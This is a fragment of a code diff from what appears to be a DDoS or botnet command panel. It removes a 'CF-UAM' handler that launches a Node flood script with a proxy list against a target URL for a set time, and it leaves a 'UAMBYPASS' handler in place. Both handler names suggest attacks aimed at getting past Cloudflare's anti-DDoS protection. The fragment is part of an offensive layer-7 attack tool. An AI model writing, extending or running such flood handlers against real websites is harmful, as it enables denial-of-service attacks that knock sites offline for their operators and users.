@@ -87,15 +87,6 @@ def main():
                 pass
                 
 # LAYER 7 METHODS
-
-      if "CF-UAM" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                os.system(f'node CF-UAM.js {url} {time} 50 proxy.txt 100')
-            except IndexError:
-                print('Usage: CF-UAM <url> <time>')
-                print('Example: CF-UAM http://example.com 100')       
                 
         elif "UAMBYPASS" in cnc:
             try:
